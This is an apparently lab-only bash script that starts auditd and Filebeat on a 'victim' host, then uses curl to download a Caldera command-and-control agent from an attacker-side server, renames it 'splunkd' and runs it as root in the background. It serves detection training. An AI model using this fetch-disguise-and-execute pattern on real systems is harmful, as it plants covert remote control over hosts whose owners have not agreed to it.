#!/usr/bin/env bash
# Cold start for soc-victim: auditd (with the SOC rules), Filebeat and the Caldera agent.
# The agent must run HERE, where auditd and Filebeat watch it. Caldera itself runs on soc-attacker.
#   bash scripts/lab/start-victim.sh
set -u
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$HERE/lib.sh"

CALDERA="${CALDERA:-http://192.168.56.30:8888}"
AGENT_DIR="${AGENT_DIR:-$HOME/agent}"

check_clock

say "Services"
sudo systemctl start auditd filebeat
for svc in auditd filebeat; do
    if systemctl is-active --quiet "$svc"; then ok "$svc running"; else bad "$svc is not running (journalctl -u $svc -n 20)"; fi
done

say "Audit rules"
count() { sudo auditctl -l 2>/dev/null | grep -c cron_change; }
n="$(count)"
if [ "${n:-0}" -ge 7 ]; then
    ok "cron_change rules loaded ($n)"
else
    warn "only ${n:-0} cron_change rules loaded, reloading"
    sudo augenrules --load >/dev/null 2>&1
    n="$(count)"
    if [ "${n:-0}" -ge 7 ]; then ok "cron_change rules loaded ($n)"; else bad "still $n rules; copy infra/auditd/soc.rules to /etc/audit/rules.d/ and rerun"; fi
fi
if sudo auditctl -l 2>/dev/null | grep -q exec_cmd; then ok "exec_cmd rule loaded"; else warn "exec_cmd rule missing"; fi

say "Agent (Caldera at $CALDERA)"
if ! curl -fs -o /dev/null --max-time 5 "$CALDERA"; then
    bad "cannot reach Caldera at $CALDERA. Start it first: bash scripts/lab/start-attacker.sh on soc-attacker"
    exit 1
fi
mkdir -p "$AGENT_DIR"
size=$(stat -c %s "$AGENT_DIR/splunkd" 2>/dev/null || echo 0)
if [ "$size" -lt 1000000 ]; then
    echo "  downloading the agent..."
    rm -f "$AGENT_DIR/splunkd" 2>/dev/null || mv "$AGENT_DIR/splunkd" "$AGENT_DIR/splunkd.bad.$$" 2>/dev/null
    curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$CALDERA/file/download" > "$AGENT_DIR/splunkd"
    chmod +x "$AGENT_DIR/splunkd"
    size=$(stat -c %s "$AGENT_DIR/splunkd" 2>/dev/null || echo 0)
fi
if [ "$size" -lt 1000000 ]; then bad "agent download is only $size bytes"; exit 1; fi
ok "agent file ready ($size bytes)"
running=$(pgrep -x splunkd | wc -l)
if [ "$running" -eq 1 ]; then
    ok "one agent already running"
else
    [ "$running" -gt 1 ] && { warn "$running agents running; stopping them so only one remains"; sudo pkill -x splunkd; sleep 2; }
    sudo -v
    (cd "$AGENT_DIR" && sudo nohup ./splunkd -server "$CALDERA" -group red > "$HOME/agent.log" 2>&1 &)
    sleep 5
    running=$(pgrep -x splunkd | wc -l)
    if [ "$running" -eq 1 ]; then ok "agent started (log: ~/agent.log)"; else bad "expected 1 agent, found $running (see ~/agent.log)"; fi
fi

say "Done. The heartbeat on the console dashboard should turn green within a few minutes, and the agent should show host soc-victim on the Caldera Agents tab."
